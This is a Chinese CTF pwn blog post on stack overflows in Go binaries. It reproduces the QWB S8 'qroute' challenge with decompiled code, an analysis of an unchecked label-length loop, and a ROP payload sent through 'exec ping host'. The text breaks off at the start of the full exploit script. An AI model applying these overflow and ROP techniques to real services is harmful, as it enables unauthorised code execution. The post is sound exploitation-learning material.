<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.126.1"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="go中的栈溢出"><meta itemprop=description content="集中一点,登峰造极"><meta name=description content="集中一点,登峰造极"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://zp9080.github.io/imgs/author.png"><meta itemprop=keywords content="go pwn"><meta property="og:type" content="article"><meta property="og:title" content="go中的栈溢出"><meta property="og:description" content="集中一点,登峰造极"><meta property="og:image" content="/imgs/author.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://zp9080.github.io/post/go-pwn/go%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/"><meta property="og:site_name" content="f1ow-blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="f1ow"><meta property="article:published_time" content="2024-11-06 23:04:56 +0800 CST"><meta property="article:modified_time" content="2024-11-06 23:04:56 +0800 CST"><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/font-awesome/6.6.0/css/all.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/animate.css/4.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href=/css/main.min.bfbac3431de920c11b5b1cafa45029ea1bc93d5d3da50fed4ab6924b4c250360.css><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":false,"isHome":false,"isPage":true,"path":"go%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA","permalink":"https://zp9080.github.io/post/go-pwn/go%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/","title":"go中的栈溢出","waline":{"js":[{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"2.15.8"},{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>go中的栈溢出 - f1ow-blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><div class=overlay></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>f1ow-blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>集中一点,登峰造极</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>207</span></a></li><li class="menu-item menu-item-categories"><a href=/categories/ class=hvr-icon-pulse rel=section><i class="fa fa-categories hvr-icon"></i>分类</a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#强网杯s8-qroute>强网杯S8-qroute</a><ul><li><a href=#第一阶段>第一阶段</a></li><li><a href=#第二阶段>第二阶段</a></li><li><a href=#第三阶段>第三阶段</a></li></ul></li><li><a href=#ciscn2023-shellwego>CISCN2023 shellwego</a><ul><li><a href=#第一阶段-1>第一阶段</a></li><li><a href=#第二阶段-1>第二阶段</a></li><li><a href=#第三阶段-1>第三阶段</a></li></ul></li><li><a href=#ciscn2024-gostack>CISCN2024 gostack</a></li><li><a href=#一些总结>一些总结</a></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=f1ow src=/imgs/img-lazy-loading.gif data-src=/imgs/author.png><p class=site-author-name itemprop=name>f1ow</p><div class=site-description itemprop=description>集中一点,登峰造极</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>207</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>38</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>80</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/zp9080 title="Github → https://github.com/zp9080" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://v3rdant.cn/ title=https://v3rdant.cn/ target=_blank>v3rdant</a></li><li class=links-of-blogroll-item><a href=https://juicymio.github.io/ title=https://juicymio.github.io/ target=_blank>juicymio</a></li><li class=links-of-blogroll-item><a href=https://ka7arotto.github.io/ title=https://ka7arotto.github.io/ target=_blank>Goku</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2024-07-28T00:00:00+00:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=273686></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=660></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2025-02-27T17:57:37+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/zp9080 rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://zp9080.github.io/post/go-pwn/go%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/author.png"><meta itemprop=name content="f1ow"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="f1ow"><meta itemprop=description content="集中一点,登峰造极"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="go中的栈溢出"><meta itemprop=description content></span><header class=post-header><h1 class=post-title itemprop="name headline">go中的栈溢出
<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/post/Go-Pwn/go%e4%b8%ad%e7%9a%84%e6%a0%88%e6%ba%a2%e5%87%ba.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2024-11-06 23:04:56 +0800 CST" itemprop="dateCreated datePublished" datetime="2024-11-06 23:04:56 +0800 CST">2024-11-06
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/go-pwn itemprop=url rel=index><span itemprop=name>PWN/Go Pwn</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>4287</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>9分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=busuanzi_value_page_pv data-path=/post/go-pwn/go%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><p>自从CISCN过后，又好久没有遇到什么go中的栈溢出了。这次打了强网有个qroute也是go中的栈溢出，借此机会复现这道题同时再做一下之前做过的go的栈溢出，总结一下go中栈溢出应该怎么发现利用</p><h1 id=强网杯s8-qroute>强网杯S8-qroute
<a class=header-anchor href=#%e5%bc%ba%e7%bd%91%e6%9d%afs8-qroute></a></h1><p>此题是参考
<a href="https://mp.weixin.qq.com/s?__biz=Mzg2OTcyODc1OA==&amp;mid=2247488557&amp;idx=1&amp;sn=8653a99a5f38d001314aaecea2372c36&amp;chksm=cf29e120dff605fb9609de0ea5a958bc5a23876a3a549aeeb8c419360a0caebed6f8335bd372&amp;mpshare=1&amp;scene=23&amp;srcid=1105BcA7zCWxRx1qSMOFMEMG&amp;sharer_shareinfo=5cd711fae5bd0dbe20177b28aa4db5df&amp;sharer_shareinfo_first=5cd711fae5bd0dbe20177b28aa4db5df#rd" title=ACT的WP复现的 rel="noopener external nofollow noreferrer" target=_blank class=exturl>ACT的WP复现的
<i class="fa fa-external-link-alt"></i>
</a>,在复现的基础上记录一下自己遇到的困难以及如何解决</p><h2 id=第一阶段>第一阶段
<a class=header-anchor href=#%e7%ac%ac%e4%b8%80%e9%98%b6%e6%ae%b5></a></h2><ul><li>正常逆向后发现程序有如下功能</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>cert 4ceb539da109caf8eea7
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>set  dns/set route/set interface
</span></span><span style=display:flex><span>set dns primary 8.8.8.8
</span></span><span style=display:flex><span>set route 192.168.1.0/24 gateway 192.168.0.1
</span></span><span style=display:flex><span>set interface eth0 ip 192.168.0.10 netmask 255.255.255.0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>show routes/show interfaces/show dns/show logs
</span></span><span style=display:flex><span>delete route/delete interface/delete dns $var
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exec ping host $var
</span></span><span style=display:flex><span>exec traceroute $var
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exit
</span></span><span style=display:flex><span>logout
</span></span></code></pre></div><p><strong>这个cert很好过（和CISCN的shellwego有点像，都是要先cert），直接就看到是个RC4</strong> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/82.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/83.png alt></p><p>接下来要做的就是逆向各个功能，但是发现大部分函数都比较正常，在<strong>exec ping</strong>中发现有个很可疑的地方 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/84.png alt></p><p><strong>go中的string一般会先存在一个比栈还高的地址，可以看到v29是可以根据v71=len不断累加的，然而赋值是个for循环， &amp;v79[v29 + 1 + j]是个栈上的地址，如果长度不合理，那么将覆盖返回地址</strong></p><p><strong>在go中，经常会看到这样的结构，buf[i]存的是一个指针，这个指针指向一个字符串，buf[i+1]存的是这个字符串的长度，可以看到v71 = *(_QWORD *)(v28 + 8);也是这种结构</strong></p><p>所以我们可以大胆猜测，这个strings_genSplit过后，<strong>返回的是一个结构体数组，每个结构体元素是有(void *)ptr,int64 len这种结构</strong>，这里就是通过&rsquo;.&lsquo;这个字符进行分割，我进行了验证发现确实如此 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/85.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/86.png alt></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#080;font-style:italic>//看到split就可以想到是通过某个字符来对整个字符串进行分割，这里是&#39;.&#39;
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>  v26 <span style=color:#666>=</span> <span style=color:#00a000>strings_genSplit</span>(a2,v102,(<span style=color:#0b0;font-weight:700>unsigned</span> <span style=color:#0b0;font-weight:700>int</span>)<span style=color:#666>&amp;</span>unk_53BC00,<span style=color:#666>1</span>,<span style=color:#666>0</span>,<span style=color:#666>-</span><span style=color:#666>1</span>,v13,v14,v15,(<span style=color:#a2f;font-weight:700>__int64</span>)v75.ptr,v75.len,v76,v77);
</span></span><span style=display:flex><span>  j <span style=color:#666>=</span> (<span style=color:#a2f;font-weight:700>__int64</span>)v79;
</span></span><span style=display:flex><span>  v28 <span style=color:#666>=</span> ((<span style=color:#a2f;font-weight:700>__int64</span> (__golang <span style=color:#666>*</span>)(<span style=color:#a2f;font-weight:700>__int64</span>, <span style=color:#a2f;font-weight:700>__int64</span>, <span style=color:#a2f;font-weight:700>__int64</span>, <span style=color:#0b0;font-weight:700>char</span> <span style=color:#666>*</span>))loc_4704F4)(v26, v102, v27, v79);
</span></span><span style=display:flex><span>  v29 <span style=color:#666>=</span> <span style=color:#666>0LL</span>;
</span></span><span style=display:flex><span>  <span style=color:#a2f;font-weight:700>while</span> ( v24 <span style=color:#666>&gt;</span> <span style=color:#666>0</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>//看到这里可以想到v28像是一个数组，v28[i]存着指针，v28[i+1]存着len，所以会有v71 = *(_QWORD *)(v28 + 8);这种赋值
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    v71 <span style=color:#666>=</span> <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)(v28 <span style=color:#666>+</span> <span style=color:#666>8</span>);
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>if</span> ( v71 <span style=color:#666>&gt;</span> <span style=color:#666>0x3F</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v96 <span style=color:#666>=</span> v10;
</span></span><span style=display:flex><span>      v72 <span style=color:#666>=</span> <span style=color:#00a000>runtime_convT64</span>(v71, v24, v29, j, (<span style=color:#0b0;font-weight:700>int</span>)v25, (<span style=color:#0b0;font-weight:700>int</span>)v12, v13, v14, v15, (<span style=color:#a2f;font-weight:700>__int64</span>)v75.ptr);
</span></span><span style=display:flex><span>      <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>v96 <span style=color:#666>=</span> <span style=color:#666>&amp;</span>RTYPE_int;
</span></span><span style=display:flex><span>      <span style=color:#666>*</span>((_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>v96 <span style=color:#666>+</span> <span style=color:#666>1</span>) <span style=color:#666>=</span> v72;
</span></span><span style=display:flex><span>      <span style=color:#a2f;font-weight:700>return</span> <span style=color:#00a000>fmt_Fprintf</span>((<span style=color:#0b0;font-weight:700>unsigned</span> <span style=color:#0b0;font-weight:700>int</span>)off_53D3C8,qword_5EC508,(<span style=color:#0b0;font-weight:700>unsigned</span> <span style=color:#0b0;font-weight:700>int</span>)<span style=color:#b44>&#34;Label length exceeds 0x3F: %d</span><span style=color:#b62;font-weight:700>\n</span><span style=color:#b44>&#34;</span>,<span style=color:#666>30</span>,(<span style=color:#0b0;font-weight:700>unsigned</span> <span style=color:#0b0;font-weight:700>int</span>)<span style=color:#666>&amp;</span>v96,<span style=color:#666>1</span>,<span style=color:#666>1</span>,v73,
</span></span><span style=display:flex><span>               v74,(<span style=color:#a2f;font-weight:700>__int64</span>)v75.ptr,v75.len,v76,v77,v78);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    v25 <span style=color:#666>=</span> <span style=color:#666>*</span>(<span style=color:#0b0;font-weight:700>unsigned</span> <span style=color:#a2f;font-weight:700>__int8</span> <span style=color:#666>**</span>)v28;
</span></span><span style=display:flex><span>    v79[v29] <span style=color:#666>=</span> v71;
</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>//所以v29是可以根据v71=len不断累加的，这种漏洞非常常见
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#a2f;font-weight:700>if</span> ( <span style=color:#666>!</span>v25 )
</span></span><span style=display:flex><span>      v25 <span style=color:#666>=</span> (<span style=color:#0b0;font-weight:700>unsigned</span> <span style=color:#a2f;font-weight:700>__int8</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>unk_60C780;
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>for</span> ( j <span style=color:#666>=</span> <span style=color:#666>0LL</span>; j <span style=color:#666>&lt;</span> v71; <span style=color:#666>++</span>j )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v12 <span style=color:#666>=</span> <span style=color:#666>&amp;</span>v79[v29 <span style=color:#666>+</span> <span style=color:#666>1</span> <span style=color:#666>+</span> j];
</span></span><span style=display:flex><span>      <span style=color:#00a000>LODWORD</span>(v13) <span style=color:#666>=</span> v25[j];
</span></span><span style=display:flex><span>      <span style=color:#666>*</span>v12 <span style=color:#666>=</span> v13;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    v28 <span style=color:#666>+=</span> <span style=color:#666>16LL</span>;
</span></span><span style=display:flex><span>    <span style=color:#666>--</span>v24;
</span></span><span style=display:flex><span>    v29 <span style=color:#666>+=</span> v71 <span style=color:#666>+</span> <span style=color:#666>1</span>;
</span></span><span style=display:flex><span>  }
</span></span></code></pre></div><h2 id=第二阶段>第二阶段
<a class=header-anchor href=#%e7%ac%ac%e4%ba%8c%e9%98%b6%e6%ae%b5></a></h2><p>根据上面的分析，可以确定就是用很多&rsquo;.&lsquo;字符来让len增加，<strong>一个&rsquo;.&lsquo;的len是0，所以这个for循环会立刻退出，但是v29 += v71 + 1;又让v29加1</strong>，所以可以实现让len增加，所以正常的也会想出如下的exp来覆盖返回地址</p><p>但是实际跑的时候会不对，所以我又进行了很长的逆向分析过程分析为什么直接这样不行</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#b44>b</span><span style=color:#b44>&#34;.&#34;</span><span style=color:#666>*</span><span style=color:#666>0x207</span><span style=color:#666>+</span>p64(pop_rbp) <span style=color:#666>+</span> p64(bss)<span style=color:#666>+</span> p64(pop_rcx) <span style=color:#666>+</span> p64(<span style=color:#666>0x200</span>) <span style=color:#666>+</span> p64(pop_rbx) <span style=color:#666>+</span> p64(<span style=color:#666>0x006102B0</span>) <span style=color:#666>+</span> p64(sys_read) <span style=color:#666>+</span> p64(leave_ret)[:<span style=color:#666>5</span>]
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>&#34;Router&#34;</span>,<span style=color:#b44>b</span><span style=color:#b44>&#34;exec ping host &#34;</span> <span style=color:#666>+</span>payload)
</span></span></code></pre></div><p>主要原因在这里,如果j&lt;=0，那么会<strong>有如下调用链LABEL_15->net_LookupIP->return ，这就直接返回了，根本走不到strings_genSplit以及那个for循环</strong></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-c data-lang=c><span style=display:flex><span> v18 <span style=color:#666>=</span> v99;
</span></span><span style=display:flex><span>  v21 <span style=color:#666>=</span> <span style=color:#666>*</span>(__int128 <span style=color:#666>**</span>)(v99 <span style=color:#666>+</span> <span style=color:#666>0x40</span>);
</span></span><span style=display:flex><span>  j <span style=color:#666>=</span> <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)(v99 <span style=color:#666>+</span> <span style=color:#666>0x48</span>);
</span></span><span style=display:flex><span>  len <span style=color:#666>=</span> v102;
</span></span><span style=display:flex><span>  <span style=color:#a2f;font-weight:700>while</span> ( <span style=color:#666>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v22 <span style=color:#666>=</span> j <span style=color:#666>&lt;=</span> <span style=color:#666>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>if</span> ( j <span style=color:#666>&lt;=</span> <span style=color:#666>0</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v17 <span style=color:#666>=</span> len;
</span></span><span style=display:flex><span>      ptr <span style=color:#666>=</span> (<span style=color:#0b0;font-weight:700>char</span> <span style=color:#666>*</span>)a2;
</span></span><span style=display:flex><span>      <span style=color:#a2f;font-weight:700>goto</span> LABEL_15;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    v23 <span style=color:#666>=</span> <span style=color:#666>*</span>((_QWORD <span style=color:#666>*</span>)v21 <span style=color:#666>+</span> <span style=color:#666>1</span>);
</span></span><span style=display:flex><span>    v12 <span style=color:#666>=</span> (<span style=color:#0b0;font-weight:700>char</span> <span style=color:#666>*</span>)<span style=color:#666>*</span>((_QWORD <span style=color:#666>*</span>)v21 <span style=color:#666>+</span> <span style=color:#666>2</span>);
</span></span><span style=display:flex><span>    v13 <span style=color:#666>=</span> <span style=color:#666>*</span>((_QWORD <span style=color:#666>*</span>)v21 <span style=color:#666>+</span> <span style=color:#666>3</span>);
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>if</span> ( len <span style=color:#666>==</span> v23 )
</span></span><span style=display:flex><span>      <span style=color:#a2f;font-weight:700>break</span>;
</span></span><span style=display:flex><span><span style=color:#a0a000>LABEL_8</span>:
</span></span><span style=display:flex><span>    v21 <span style=color:#666>+=</span> <span style=color:#666>2</span>;
</span></span><span style=display:flex><span>    <span style=color:#666>--</span>j;
</span></span><span style=display:flex><span>  }
</span></span></code></pre></div><p>这里我就很不明白，<strong>可以看到ACT战队师傅的WP里面是有set_dns(payload,b'1.1.1.1&rsquo;)这一步的</strong>，于是我ida动调跟进看了看 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/87.png alt></p><p>可以看到set dns后这里的j变成了1 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/88.png alt>
如果不做set dns对应的地方的值是这样的 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/89.png alt></p><p>我又做了如下尝试</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>set dns aaaa 1.1.1.1
</span></span><span style=display:flex><span>set dns bbbb 2.2.2.2
</span></span><span style=display:flex><span>exec ping host aaaa
</span></span></code></pre></div><p>跟进看到如下结果，这里的j对应的值又变成了2 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/90.png alt></p><p>所以可以得出结论，这里的set dns之后会在栈上有相应的记录，这个j = *(_QWORD *)(v99 + 0x48);的赋值应该就是设置的dns的数目</p><p><strong>确实是搞清楚了这一步的原因，但是对于我来说，如果我在比赛中做这个题，我该如何想到是这一步的影响呢，这里我还没有想通，即使我再怎么动调，可能还是难以想到这里是set dns导致了程序流程这样的走向，可能这还需要一点猜测和悟性</strong></p><h2 id=第三阶段>第三阶段
<a class=header-anchor href=#%e7%ac%ac%e4%b8%89%e9%98%b6%e6%ae%b5></a></h2><p>解决了上述问题后，能够覆盖到返回地址，基本上就是个布置ROP了，没有太多难度，需要注意golang函数调用方式，可以参考
<a href=https://www.jianshu.com/p/33c07f807ba9 title=这篇文章 rel="noopener external nofollow noreferrer" target=_blank class=exturl>这篇文章
<i class="fa fa-external-link-alt"></i></a></p><ul><li>exp</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u64
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u32
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u16
